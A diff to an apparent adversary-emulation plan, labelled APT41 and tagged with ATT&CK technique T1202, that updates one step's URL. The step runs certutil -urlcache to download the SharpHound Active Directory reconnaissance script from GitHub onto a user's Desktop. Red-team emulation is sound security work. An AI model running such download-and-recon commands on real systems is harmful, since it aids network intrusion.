@@ -279,7 +279,7 @@
             "30": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
-                "request": "certutil -urlcache -split -f https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1 %USERPROFILE%\\Desktop\\APT41\\SharpHound.ps1",
+                "request": "certutil -urlcache -split -f https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 %USERPROFILE%\\Desktop\\APT41\\SharpHound.ps1",
                 "rtags": [
                     "att&ck-technique:T1202"
                 ],
